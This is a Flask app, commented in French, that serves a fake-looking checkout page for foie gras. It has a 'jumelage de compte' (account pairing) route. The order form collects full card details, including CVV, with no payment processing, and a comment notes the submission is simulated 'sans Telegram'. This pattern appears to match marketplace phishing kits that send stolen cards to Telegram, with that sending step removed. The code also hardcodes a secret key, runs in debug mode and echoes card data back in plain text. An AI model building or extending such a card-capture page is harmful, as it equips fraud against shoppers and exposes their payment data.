from flask import Flask, render_template, request, redirect, url_for, flash
from datetime import datetime
import logging

app = Flask(__name__)
app.secret_key = 'une_clé_secrète_par_défaut'  # Clé secrète pour les messages flash

# Configuration du logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Données factices pour l'exemple
data = {
    'payment_method': 'Carte de crédit',
    'final_total': '316,99 €',
    'payment_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
    'product_name': 'Lot de 10 unités de foie gras Labeyrie 285g',
    'subtotal': '257,00 €',
    'delivery_cost': '59,99 €',
    'first_name': 'John',
    'last_name': 'Doe',
    'address': '1 Rue de la Paix, 75001 Paris',
    'phone': '+33 6 12 34 56 78'
}

# Route pour la page de validation
@app.route('/')
def validation():
    return render_template('validation.html', data=data)

# Route pour traiter la commande
@app.route('/commander', methods=['POST'])
def commander():
    if request.method == 'POST':
        # Récupérer les données du formulaire
        form_data = {
            'first_name': request.form.get('first-name'),
            'last_name': request.form.get('last-name'),
            'email': request.form.get('email'),
            'phone': request.form.get('phone'),
            'address': request.form.get('address'),
            'billing_address': request.form.get('billing-address'),
            'quantity': request.form.get('quantity'),
            'subtotal': request.form.get('subtotal'),
            'delivery_cost': request.form.get('delivery-cost'),
            'discount': request.form.get('discount'),
            'final_total': request.form.get('final-total'),
            'note': request.form.get('note'),
            'payment_method': request.form.get('payment-method'),
            'cardholder_name': request.form.get('cardholder-name'),
            'card_number': request.form.get('card-number'),
            'expiry_date': request.form.get('expiry-date'),
            'cvv': request.form.get('cvv'),
            'installment_plan': request.form.get('installment-plan')
        }

        # Validation des champs obligatoires
        required_fields = ['first_name', 'last_name', 'email', 'phone', 'address', 'payment_method']
        for field in required_fields:
            if not form_data[field]:
                flash(f"Le champ {field.replace('_', ' ')} est obligatoire.", 'error')
                return redirect(url_for('validation'))

        # Mettre à jour les données dynamiques
        data.update(form_data)
        data['payment_date'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Simuler un envoi réussi (sans Telegram)
        logger.info("Commande traitée avec succès (simulation).")
        flash("Votre commande a été traitée avec succès !", 'success')
        return redirect(url_for('confirmation'))

    return redirect(url_for('validation'))

# Route pour la page de confirmation
@app.route('/confirmation')
def confirmation():
    return render_template('confirmation.html', data=data)

# Route pour traiter le jumelage de compte
@app.route('/jumeler', methods=['POST'])
def jumeler():
    if request.method == 'POST':
        form_data = {
            'first_name': request.form.get('first-name'),
            'last_name': request.form.get('last-name'),
            'email': request.form.get('email'),
            'phone': request.form.get('phone'),
            'total': request.form.get('total')
        }

        # Validation des champs obligatoires
        required_fields = ['first_name', 'last_name', 'email', 'phone', 'total']
        for field in required_fields:
            if not form_data[field]:
                flash(f"Le champ {field.replace('_', ' ')} est obligatoire.", 'error')
                return redirect(url_for('validation'))

        # Simuler un envoi réussi (sans Telegram)
        logger.info("Demande de jumelage traitée avec succès (simulation).")
        flash("Votre demande de jumelage a été envoyée avec succès !", 'success')
        return redirect(url_for('jumeler_page'))

    return redirect(url_for('validation'))

# Route pour la page de jumelage
@app.route('/jumeler')
def jumeler_page():
    return render_template('jumeler.html', data=data)

# Démarrer l'application Flask
if __name__ == '__main__':
    app.run(debug=True, port=5011)
